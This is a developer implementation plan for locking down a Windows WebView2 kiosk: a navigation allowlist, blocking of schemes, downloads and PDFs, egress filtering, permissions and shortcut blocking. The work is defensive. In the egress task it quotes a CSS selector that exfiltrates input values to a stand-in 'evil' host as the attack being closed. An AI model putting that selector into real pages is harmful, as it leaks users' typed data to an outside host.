# P1-D2b — Webview Hardening + Navigation Guard Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.
>
> **EXECUTION HOST: Windows only.** Every COM task compiles/TDDs/smoke-tests on the Windows host (WebView2). Host-testable pure-logic tasks (T1 NavPolicy, and the pure fns in T3/T5/T6) run with `cargo test -p kiosk-main` on the x64 cross-toolchain (the aarch64 Git Bash `link.exe` block and the Linux no-webkit2gtk block both prevent a controller-side run — rely on implementer evidence + reviewer code-read, exactly as P1-D2a did).

**Goal:** Apply the §7 hardening control set and the §3.6 navigation guard to the P1-D2a webview — turning "a fullscreen browser" into a locked kiosk.

**Architecture:** A single `arc_swap::ArcSwap<NavPolicy>` (compiled allowlist + scheme list + implicit-home + bootstrap-window origin) is written by the config-apply path on every `ConfigApplied` and read lock-free by the WebView2 callbacks. D2a's detect-only `nav.rs` `NavigationStarting` hook becomes the enforcement point (`args.Cancel` on a `nav::decide` block). All per-OS code stays in `crates/kiosk-main/src/` platform modules, reached via Tauri `with_webview` → `webview2-com`.

**Tech Stack:** Rust, Tauri 2.11.x, `webview2-com`, `windows` crate, `arc_swap`, `kiosk-core` (`nav::decide` + `Allowlist`, already adversarially host-tested — RT-03).

**Design spec:** `docs/superpowers/specs/2026-07-18-p1d2b-webview-hardening-design.md`.

## Global Constraints

- **Windows / P1 only.** The §7 Linux (WebKitGTK) and Android columns are P2/P3 — do not implement them. Guard COM behind `#[cfg(windows)]` with a non-Windows `eprintln!` stub, exactly as D2a `nav.rs` does.
- **Never reimplement the matcher.** All navigation/scheme decisions go through `kiosk_core::nav::decide(url, &allowlist, &scheme_allowlist, is_remote_origin)` — NEVER `Allowlist::allows` or `scheme::scheme_decision` directly (the P1-C final review closed that seam: allowlist-first wiring reopens the kiosk://-from-remote hole). D2b only *feeds* `decide` and *acts* on its `Decision`.
- **Enforcement is native, main-frame-scoped** (spec §3.6/§8): `NavigationStarting.IsMainFrame` for the top-level allowlist; sub-resources are the separate egress boundary (T4). No JS-based guard.
- **`is_remote_origin`** is the app-origin classification D2a already ships as `nav::feeds_fsm` — reuse/extend it (host `!= tauri.localhost && != kioskasset.localhost`). App-origin bundled pages (splash/offline/error/pdf) are trusted and MUST NOT be blocked or fed to the FSM.
- **`nav.blocked` telemetry** carries the structured `kiosk_core::nav::BlockReason::as_str()` (stable dashboard names) + the redacted URL. Rate-limited by the existing `Logger` (nav.blocked 10/min) — do not add a second limiter.
- **Injection is document-start** (`WebviewWindowBuilder::initialization_script`, set at build time from the boot config). Operator `inject_css`/`inject_js` knobs are P2 — this ships only the built-in control injections.
- **Telemetry may never panic the kiosk.** `Telemetry` is `try_send`-only (D2a); keep it so.
- **Shortcut/`WH_KEYBOARD_LL` is best-effort defense-in-depth, NOT a security boundary** (Tauri #13919). The covering boundary is §7.2 OS lockdown (Assigned Access / Shell Launcher). Do not claim it as a boundary in comments or telemetry.

## D2a interfaces this plan builds on (already merged, f34953f + 4e8a9dc)

```rust
// crates/kiosk-main/src/nav.rs  (D2a, Windows)
fn feeds_fsm(url: &str) -> bool          // host != tauri.localhost && != kioskasset.localhost && parseable
pub fn install(window: &tauri::WebviewWindow, tx: mpsc::Sender<AppEvent>, telem: Telemetry)
//   subscribes NavigationStarting (navId->uri map) + NavigationCompleted (IsSuccess -> Commit/Fail),
//   DETECT ONLY today: no args.Cancel. D2b adds enforcement in the NavigationStarting handler.
// crates/kiosk-main/src/effect.rs (D2a): PageTarget, page_for(&Effect); APP_ORIGIN="http://tauri.localhost"
// crates/kiosk-main/src/boot.rs   (D2a): boot(ini,dir)->Booted{manager,machine_cfg,first_event,warnings}
// crates/kiosk-main/src/fetch.rs  (D2a): run(manager,url,poll_s,tx,telem,refetch,cancel) — applies + sends ConfigApplied AT LEVEL
// crates/kiosk-main/src/main.rs   (D2a): builds the fullscreen webview, spawns tasks, installs nav::install + panic hook

// kiosk-core::nav (P1-C, host-tested)
pub fn decide(url:&str, allowlist:&Allowlist, scheme_allowlist:&[String], is_remote_origin:bool) -> Decision
pub enum Decision { Allow, Block(BlockReason) }         // is_allowed(), block_reason()
pub enum BlockReason { NotAllowlisted, Unparseable, SchemeNotAllowed, KioskSchemeFromRemote }  // as_str()
Allowlist::compile(patterns:&[String]) -> Allowlist     // confirm exact constructor name in nav/allowlist.rs
// kiosk-core::config::schema::Content { url, allowlist, scheme_allowlist, permissions, zoom,
//   pdf_view, ... }  Permissions { camera, microphone, geolocation, notifications, clipboard_read }
```

---

### Task 1: `NavPolicy` + shared live-allowlist state (host-tested foundation)

**Files:**
- Modify: `crates/kiosk-main/Cargo.toml` (add `arc-swap = "1"`)
- Create: `crates/kiosk-main/src/nav_policy.rs`
- Modify: `crates/kiosk-main/src/main.rs` (own the `SharedNavPolicy`, store initial, thread into fetch), `crates/kiosk-main/src/fetch.rs` (store on each apply)
- Test: `crates/kiosk-main/src/nav_policy.rs`

**Interfaces:**
- Produces: `struct NavPolicy { allowlist, scheme_allowlist, implicit_home, active_origin }`; `type SharedNavPolicy = Arc<ArcSwap<NavPolicy>>`; `fn NavPolicy::from_config(content: &Content, active_url: &str) -> NavPolicy`; `fn is_remote_origin(url: &str) -> bool` (the app-origin classifier, moved from `nav::feeds_fsm` and shared); `fn decision_for(&self, url: &str) -> Decision`.
- Consumes: `kiosk_core::nav::{decide, Allowlist, Decision}`, `kiosk_core::config::schema::Content`.

- [ ] **Step 1: Add dep + failing test.** Add `arc-swap = "1"` to `[dependencies]`. Create `nav_policy.rs`:

```rust
#[cfg(test)]
mod tests {
    use super::*;
    use kiosk_core::config::schema::Content;

    fn content(allow: &[&str], schemes: &[&str]) -> Content {
        Content {
            url: Some("https://home.test/app".into()),
            allowlist: allow.iter().map(|s| s.to_string()).collect(),
            scheme_allowlist: schemes.iter().map(|s| s.to_string()).collect(),
            ..Content::default()
        }
    }

    #[test]
    fn home_is_implicitly_allowed_even_if_not_in_allowlist() {
        let p = NavPolicy::from_config(&content(&["https://other.test/*"], &[]), "https://home.test/app");
        assert!(p.decision_for("https://home.test/app").is_allowed(), "home must never self-block (cfg-02)");
    }

    #[test]
    fn off_allowlist_remote_url_is_blocked() {
        let p = NavPolicy::from_config(&content(&["https://home.test/*"], &[]), "https://home.test/app");
        assert!(!p.decision_for("https://evil.test/x").is_allowed());
    }

    #[test]
    fn empty_allowlist_locks_to_active_origin() {                 // arch-08 bootstrap window
        let p = NavPolicy::from_config(&content(&[], &[]), "https://home.test/app");
        assert!(p.decision_for("https://home.test/anything").is_allowed(), "same origin allowed");
        assert!(!p.decision_for("https://home.test.evil.com/").is_allowed(), "different host blocked");
    }

    #[test]
    fn app_origin_pages_are_not_remote() {
        assert!(!is_remote_origin("http://tauri.localhost/error.html"));
        assert!(!is_remote_origin("http://kioskasset.localhost/kiosk-offline.mp4"));
        assert!(is_remote_origin("https://home.test/app"));
        assert!(!is_remote_origin("http://tauri.localhost.evil.com/"), "host-match not prefix"); // NOTE: verify
    }
}
```

Run `cargo test -p kiosk-main nav_policy::` → FAIL.

- [ ] **Step 2: Implement `NavPolicy`.**

```rust
use std::sync::Arc;
use arc_swap::ArcSwap;
use kiosk_core::config::schema::Content;
use kiosk_core::nav::{decide, Decision};
use kiosk_core::nav::allowlist::Allowlist;

pub type SharedNavPolicy = Arc<ArcSwap<NavPolicy>>;

pub struct NavPolicy {
    allowlist: Allowlist,
    scheme_allowlist: Vec<String>,
    implicit_home: String,     // always-allowed home (cfg-02)
    active_origin: String,     // arch-08: scheme+host of the active URL when allowlist empty
}

/// App-origin (bundled pages / mp4) vs remote content. Single source of truth; `nav.rs`
/// re-exports this so the FSM-feed filter and the nav guard agree by construction.
pub fn is_remote_origin(url: &str) -> bool {
    match tauri::Url::parse(url).ok().and_then(|u| u.host_str().map(str::to_string)) {
        Some(host) => host != "tauri.localhost" && host != "kioskasset.localhost",
        None => false,
    }
}

impl NavPolicy {
    pub fn from_config(content: &Content, active_url: &str) -> NavPolicy {
        let patterns = if content.allowlist.is_empty() {
            vec![origin_pattern(active_url)]          // arch-08: origin-lock, all paths
        } else {
            content.allowlist.clone()
        };
        NavPolicy {
            allowlist: Allowlist::compile(&patterns),           // confirm ctor name/signature
            scheme_allowlist: content.scheme_allowlist.clone(),
            implicit_home: content.url.clone().unwrap_or_else(|| active_url.to_string()),
            active_origin: origin_of(active_url),
        }
    }

    pub fn decision_for(&self, url: &str) -> Decision {
        if url == self.implicit_home { return Decision::Allow; }     // home never self-blocks
        decide(url, &self.allowlist, &self.scheme_allowlist, is_remote_origin(url))
    }
}
// origin_pattern / origin_of: build "scheme://host/*" and "scheme://host" from a URL
// (parse with tauri::Url; on parse failure the pattern is unsatisfiable → default-deny).
```

Run → PASS. (If `Allowlist::compile` differs, read `nav/allowlist.rs` for the real constructor — do not guess.)

- [ ] **Step 3: Thread `SharedNavPolicy` through config-apply.** In `main.rs`: after `boot()`, build the initial policy `Arc::new(ArcSwap::from_pointee(NavPolicy::from_config(&manager.current().content, &manager.home_url())))` and clone it into (a) `fetch::run` and (b) the nav-guard install (Task 2). In `fetch.rs::run`, on `FetchOutcome::Applied`, `policy.store(Arc::new(NavPolicy::from_config(&manager.current().content, &home_url)))` **before** sending `ConfigApplied` — so a navigation triggered by the new config is judged by the new policy.

- [ ] **Step 4: Move `is_remote_origin` into `nav_policy` and re-export from `nav.rs`.** Replace `nav::feeds_fsm`'s body with `nav_policy::is_remote_origin` (keep the name/callsite; delete the duplicate host check) so both the FSM-feed filter and the guard share one classifier. Run `cargo test -p kiosk-main` → all green.

- [ ] **Step 5: fmt, clippy (`cargo clippy -p kiosk-main --no-deps -- -D warnings`), commit.**

```bash
git add -A && git commit -m "feat(main): NavPolicy live-allowlist state (arc_swap), shared is_remote_origin"
```

---

### Task 2: Navigation guard — enforce the allowlist (Windows)

**Files:**
- Modify: `crates/kiosk-main/src/nav.rs` (add enforcement in the `NavigationStarting` handler), `crates/kiosk-main/src/main.rs` (pass `SharedNavPolicy` into `nav::install`)

**Interfaces:**
- Consumes: `SharedNavPolicy`, `nav::decide` via `NavPolicy::decision_for`, WebView2 `ICoreWebView2NavigationStartingEventArgs` (`Uri`, `IsMainFrame`, `Cancel`).

- [ ] **Step 1: Host-test the classification helper.** In `nav.rs`, add a pure `fn should_block(policy: &NavPolicy, url: &str, is_main_frame: bool) -> Option<BlockReason>` — `None` (allow) if not main-frame (sub-resources are T4's job) or `decision_for` allows; else `Some(reason)`. Test it: main-frame off-allowlist → `Some(NotAllowlisted)`; sub-frame off-allowlist → `None` (not this guard's scope); main-frame home → `None`. Run `cargo test -p kiosk-main nav::` → PASS.

- [ ] **Step 2: Wire enforcement into the existing `NavigationStarting` handler** (the one D2a added for the navId→uri map). Inside the Windows handler, after reading `Uri` + `IsMainFrame`:

```rust
// pseudo — fill against the real webview2-com args API (as D2a Task 6 did):
let uri = args.Uri()? ; let is_main = args.IsMainFrame()?.as_bool();
if let Some(reason) = should_block(&policy.load(), &uri, is_main) {
    args.SetCancel(true)?;                                   // cancel the navigation
    telem.nav_blocked(reason.as_str(), &uri);               // Task-5 helper; rate-limited by Logger
    // do NOT populate the navId map for a cancelled nav (no NavigationCompleted will follow)
} else {
    // existing D2a behaviour: record navId->uri for outcome correlation
}
```

`policy` is the `SharedNavPolicy` clone captured into the closure; `.load()` is lock-free.

- [ ] **Step 3: New-window → same webview.** Subscribe `NewWindowRequested` → set `Handled=true` and navigate the current webview to the requested URI (which then re-enters this guard), per §3.6. Confirm the exact `webview2-com` handler + args.

- [ ] **Step 4: Add `Telemetry::nav_blocked(reason:&str, url:&str)`** (Task-5-style helper on the D2a `Telemetry` handle): emits `LogEvent::NavBlocked` with fields `{ reason, url: <redacted> }`. Redact via the existing `kiosk_core::logging` URL redaction (confirm the exposed fn) — never log a raw remote URL.

- [ ] **Step 5: Windows smoke (record in the task report).** Launch with an allowlist of `["https://<site>/*"]`; click/redirect to an off-allowlist host → navigation blocked, page stays, `nav.blocked{reason:"not_allowlisted"}` in Cloud Logging. Home + in-allowlist links still load. `kiosk://` typed/injected from the remote page → blocked (`kiosk_scheme_from_remote`).

- [ ] **Step 6: fmt, clippy, commit.**

```bash
git add -A && git commit -m "feat(main): native main-frame navigation guard via nav::decide"
```

---

### Task 3: External-scheme block + downloads/PDF block (Windows + host-tested decisions)

**Files:**
- Modify: `crates/kiosk-main/src/nav.rs` or new `crates/kiosk-main/src/scheme_guard.rs`

**Interfaces:**
- Produces: `fn pdf_decision(content_type: &str, pdf_view: bool) -> bool` (block?), `fn scheme_allowed(scheme: &str, allow: &[String]) -> bool` — both pure/host-tested.
- Consumes: WebView2 `LaunchingExternalUriScheme`, `DownloadStarting`, `NavigationStarting`/`ContentLoading` content-type.

- [ ] **Step 1: Host-test the pure decisions.** `scheme_allowed("mailto", &[])` → false; `scheme_allowed("tel", &["tel".into()])` → true (bare scheme, no colon — the P1-C carry-forward). `pdf_decision("application/pdf", false)` → block=true; `pdf_decision("application/pdf", true)` → block=false (routes to bundled pdf.js, a later phase — D2b blocks-by-default, `true` just means "don't block here"); `pdf_decision("text/html", false)` → false. Run `cargo test -p kiosk-main` → after impl, PASS.

- [ ] **Step 2: External schemes (H2).** Subscribe `LaunchingExternalUriScheme` → `args.Cancel = true` unless `scheme_allowed(scheme, &policy.load().scheme_allowlist)`; on block emit `nav.blocked{reason:"scheme_not_allowed", scheme}`. (WebView2 raises this instead of `NavigationStarting` for `mailto:`/`tel:`/`ms-*:` etc.)

- [ ] **Step 3: Downloads (§7).** Subscribe `DownloadStarting` → `args.Cancel = true` always (downloads are blocked in P1); emit `nav.blocked{reason:"download"}` (add a `download` note in the fields, reuse `NavBlocked`).

- [ ] **Step 4: PDF (M4).** A main-frame navigation resolving to `application/pdf` with `pdf_view=false` → block (`nav.blocked`). Detect the content-type via the available WebView2 signal (`ContentLoading`/`WebResourceResponseReceived` — confirm which exposes the header pre-render) and cancel. `pdf_view=true` → allow (the bundled pdf.js viewer route is a later phase; do not implement it here — just don't block).

- [ ] **Step 5: Windows smoke.** A `mailto:` link does nothing (no mail app launches) + `nav.blocked`. A download link cancels. A PDF link is blocked with `pdf_view=false`.

- [ ] **Step 6: fmt, clippy, commit.**

```bash
git add -A && git commit -m "feat(main): external-scheme, download, and PDF blocking"
```

---

### Task 4: Egress containment — subresource allowlist + CSP (SEC-10, Windows)

**Files:**
- Modify: `crates/kiosk-main/src/nav.rs` / a new `egress.rs`; the injection bundle (Task 6) for the CSP

**Interfaces:**
- Consumes: WebView2 `WebResourceRequested` (`AddWebResourceRequestedFilter` with `COREWEBVIEW2_WEB_RESOURCE_CONTEXT_ALL`).

- [ ] **Step 1: Reuse the T1 `NavPolicy` allowlist for resources.** Add `NavPolicy::resource_allowed(&self, url:&str) -> bool` (a resource is allowed if its URL matches the allowlist OR is an app origin — bundled CSS/JS load from `tauri.localhost`). Host-test: an off-allowlist `https://evil/a` → false; an in-allowlist subresource → true; `http://tauri.localhost/...` → true. Run → PASS.

- [ ] **Step 2: Subscribe `WebResourceRequested` (ALL contexts).** `AddWebResourceRequestedFilter("*", COREWEBVIEW2_WEB_RESOURCE_CONTEXT_ALL)`, then in the handler cancel off-list requests by setting a synthetic blocked `Response` (WebView2 has no `Cancel` on this arg — set `args.Response` to a 403 empty response via `CreateWebResourceResponse`). This closes the CSS/JS exfiltration (`input[value^="a"]{background:url(https://evil/a)}`, `fetch`, beacon) that never triggers a navigation. Emit a **rate-limited** `nav.blocked{reason:"egress", url}` (the Logger's nav.blocked bucket already coalesces — do not flood).

- [ ] **Step 3: Inject a restrictive CSP** as part of the Task-6 document-start bundle (`default-src` limited to the content origin + `tauri.localhost`); belt-and-suspenders alongside the native filter. Document residual gaps (service workers, some preload paths) in a comment, per spec.

- [ ] **Step 4: Windows smoke.** Load a test page with an off-allowlist `<img src=https://evil/...>` and a CSS `url(https://evil/...)` exfil probe → both requests blocked (network tab / no hit on the evil host), `nav.blocked{reason:"egress"}` coalesced in Cloud Logging. In-allowlist subresources still load; the page's own bundled assets still load.

- [ ] **Step 5: fmt, clippy, commit.**

```bash
git add -A && git commit -m "feat(main): egress containment — subresource allowlist + CSP (SEC-10)"
```

---

### Task 5: WebView2 settings flags + script dialogs + permissions (Windows + host-tested lookup)

**Files:**
- Create: `crates/kiosk-main/src/hardening.rs` (the `with_webview` settings block); modify `main.rs` to call it

**Interfaces:**
- Produces: `fn permission_allowed(kind: PermissionKind, perms: &Permissions) -> bool` (pure/host-tested).
- Consumes: `ICoreWebView2Settings`, `ICoreWebView2Controller`, `PermissionRequested`/`ScriptDialogOpening` handlers.

- [ ] **Step 1: Host-test the permission map (M9, default-deny).** `permission_allowed(Camera, &Permissions::default())` → false; with `camera=true` → true; an unmapped kind → false. (`PermissionKind` = a small local enum mirroring WebView2's `COREWEBVIEW2_PERMISSION_KIND`; map camera/mic/geolocation/notifications/clipboard-read → the `Permissions` fields, everything else → deny.) Run → PASS.

- [ ] **Step 2: Settings flags** in `hardening::apply(&webview)` via `with_webview` → `controller.CoreWebView2()?.Settings()`: `SetAreDefaultContextMenusEnabled(false)`, `SetAreDevToolsEnabled(false)`, `SetIsZoomControlEnabled(false)`, `SetIsPinchZoomEnabled(false)` (Controller-level — WebView2Feedback #459), `SetIsGeneralAutofillEnabled(false)`, `SetIsPasswordAutosaveEnabled(false)` + `SetIsPasswordAutofillEnabled(false)` (via the `Settings4`/`Settings` interface that exposes them), `SetAreDefaultScriptDialogsEnabled(false)`.

- [ ] **Step 3: Script dialogs (M3).** Subscribe `ScriptDialogOpening` → auto-dismiss `beforeunload` (never surface), and rate-limit `alert`/`confirm`/`prompt` (a small per-window token bucket; over-cap → auto-dismiss). Never surface a dialog on a blocked navigation. Leniency keyed app-origin vs remote-origin (`is_remote_origin`).

- [ ] **Step 4: Permissions (M9).** Subscribe `PermissionRequested` → map the WebView2 kind to `PermissionKind`, `args.State = Allow` iff `permission_allowed(kind, &policy.load()... )` else `Deny`. (Permissions come from `content.permissions`; thread the current value via `SharedNavPolicy` or a parallel `ArcSwap<Permissions>` — reuse the T1 store to avoid a second cell.)

- [ ] **Step 5: Windows smoke.** No right-click menu; F12/devtools dead; Ctrl+`+`/pinch does not zoom; a form does not offer to save a password; `alert()` spam is throttled; a `getUserMedia()` camera request is denied without a prompt.

- [ ] **Step 6: fmt, clippy, commit.**

```bash
git add -A && git commit -m "feat(main): WebView2 settings flags, script-dialog + permission policy"
```

---

### Task 6: Injection engine + zoom + cursor-autohide + keep-awake + focus.lost (Windows + host-tested assembly)

**Files:**
- Create: `crates/kiosk-main/src/inject.rs` (the document-start script assembly); modify `main.rs` (pass `initialization_script` to the builder; keep-awake + focus handlers)

**Interfaces:**
- Produces: `fn build_injection(cursor_autohide_seconds: u64, select_text: bool) -> String` (pure/host-tested).
- Consumes: `WebviewWindowBuilder::initialization_script`, `SetThreadExecutionState`, window focus events.

- [ ] **Step 1: Host-test the injected-script assembly.** `build_injection(5, false)` contains: `* { user-select: none }` (+ `input,textarea{user-select:text}`), `dragstart`/`drop` `preventDefault`, `Object.defineProperty(window,"print",{value:()=>{},writable:false,configurable:false})`, and a cursor-autohide block referencing `5000` ms. `build_injection(0, _)` omits the autohide timer (0 = off). `select_text=true` omits the `user-select:none`. Assert the substrings. Run → PASS.

- [ ] **Step 2: Wire injection at build time.** In `main.rs`, after `boot()`, `builder.initialization_script(&build_injection(content.idle... no — cursor_autohide from display.cursor_autohide_seconds, and input.allow_text_selection))`. (Read the exact field paths from `RemoteConfig`: `display.cursor_autohide_seconds`, `input.allow_text_selection`.) Document that a later config change to these applies on the next restart (nightly reload) — injection is document-start only.

- [ ] **Step 3: Zoom factor.** Apply `content.zoom` via the WebView2 `Controller.ZoomFactor` in `hardening::apply` (fixed; zoom control already disabled in T5).

- [ ] **Step 4: Keep-awake + focus.lost.** `SetThreadExecutionState(ES_CONTINUOUS | ES_DISPLAY_REQUIRED | ES_SYSTEM_REQUIRED)` at startup if `display.keep_awake`. Subscribe the window deactivation/`GotFocus`-loss → emit `focus.lost` (WARNING) and re-assert foreground (`set_focus`), per §7.

- [ ] **Step 5: Windows smoke.** Text un-selectable (except inputs); drag does nothing; `window.print()` + Ctrl+P do nothing; cursor hides after 5 s idle, returns on move; display does not sleep; alt-tabbing away logs `focus.lost` and the kiosk reasserts.

- [ ] **Step 6: fmt, clippy, commit.**

```bash
git add -A && git commit -m "feat(main): injection engine, zoom lock, cursor autohide, keep-awake, focus reassert"
```

---

### Task 7: Shortcut blocking + renderer crash/hang recovery (Windows)

> **ProcessFailed placement decision (design open-item resolved):** renderer crash/hang recovery lands **here**, at the tail of D2b, not D2c. Rationale: it is a `with_webview`/WebView2-controller concern (same seam as every other control in this plan), it is a P1 spec deliverable, and D2c is about *native input* (idle/exit/PIN) — a different subsystem. Keeping it here means D2c is purely the input layer.

**Files:**
- Create: `crates/kiosk-main/src/shortcuts.rs` (AcceleratorKeyPressed swallow-list + the `WH_KEYBOARD_LL` hook, adapted from the deleted P0 spike — recover it from git history `spike.rs` at the P0 tag), `crates/kiosk-main/src/recovery.rs` (ProcessFailed)

**Interfaces:**
- Produces: `fn should_swallow(vk: u32, mods: Modifiers) -> bool` (pure/host-tested).
- Consumes: `AcceleratorKeyPressed`, `WH_KEYBOARD_LL`, `ICoreWebView2.ProcessFailed`.

- [ ] **Step 1: Host-test the swallow list.** `should_swallow` returns true for Ctrl+W/N/T/P, F5, F11, App/Menu key, Alt+F4/Tab/Esc, Ctrl+Esc, Win combos (per §7's explicit list); false for ordinary keys and in-page typing. Table-driven test. Run → PASS.

- [ ] **Step 2: `AcceleratorKeyPressed`.** Subscribe on the `Controller` → for a key in the swallow list set `Handled=true`. This covers accelerators the webview receives (Ctrl+W/P/N/T, F5, F11).

- [ ] **Step 3: `WH_KEYBOARD_LL` (best-effort).** Recover the P0 spike's low-level hook (git show the P0-tag `spike.rs`), on a dedicated pump-isolated thread, swallowing the global chords (Alt+F4/Tab, Win combos) the webview never sees. **Comment clearly: NOT a security boundary (Tauri #13919 — the hook is dropped while WebView2 is focused and past `LowLevelHooksTimeout`); §7.2 OS lockdown is the covering boundary.**

- [ ] **Step 4: Renderer recovery (`ProcessFailed`).** Subscribe `ICoreWebView2.ProcessFailed` → `RenderProcessUnresponsive` → `Reload()`; `RenderProcessExited`/`RenderProcessCrashed` → recreate/reload the webview to the current `home`. Emit `webview.crash` (ERROR) with the failure kind. (This is the P1 spec's "renderer hang + crash recovery" — `CoreWebView2.ProcessFailed`.)

- [ ] **Step 5: Windows smoke.** Alt+F4 / Alt+Tab / Ctrl+W do not escape the kiosk (with the caveat that OS-reserved chords need §7.2). Kill the WebView2 renderer process (Task Manager → the `msedgewebview2.exe` child) → the kiosk reloads to home + `webview.crash` in Cloud Logging.

- [ ] **Step 6: fmt, clippy, commit.**

```bash
git add -A && git commit -m "feat(main): shortcut blocking + renderer crash/hang recovery (ProcessFailed)"
```

---

## Self-Review

**Spec coverage (§3.6 + §7 Windows column + design doc):** nav guard main-frame + kiosk-from-remote → T2; external schemes → T3; egress/SEC-10 → T4; context-menu/devtools/zoom+pinch/autofill/script-dialogs → T5; permissions M9 → T5; injection engine + text-select/drag/print/cursor + zoom + keep-awake + focus.lost → T6; shortcuts + ProcessFailed → T7; live-allowlist plumbing (the D2a↔D2b contract) → T1. Downloads + PDF → T3. **Covered.** Deferred by design: Linux/Android columns (P2/P3), operator inject_css/js knobs (P2), bundled pdf.js viewer (later), native idle/exit/PIN (D2c).

**Placeholder scan:** COM steps reference **existing** WebView2 events/args by their documented names + the D2a `nav.rs` pattern to follow; the exact `webview2-com` arg method spellings are read from the crate at implementation time (as D2a Task 6 did successfully) rather than guessed. Every host-testable task carries real, runnable test code. "confirm exact ctor/fn" notes point at real kiosk-core/webview2-com APIs, not invented ones.

**Type consistency:** `NavPolicy`/`SharedNavPolicy`/`is_remote_origin` defined in T1, consumed uniformly T2–T6. `BlockReason::as_str()` telemetry names from kiosk-core. `Telemetry::nav_blocked` defined T2, reused T3/T4. `should_block`/`should_swallow`/`permission_allowed`/`pdf_decision`/`build_injection` are the pure host-tested seams, each defined where produced.

**Scope:** One coherent sub-project (Windows hardening + nav guard). Seven tasks, each an independent reviewer gate; the pure-logic slices are host-tested, the COM wiring is Windows-host with per-task smoke. ProcessFailed placement resolved (T7, not D2c).
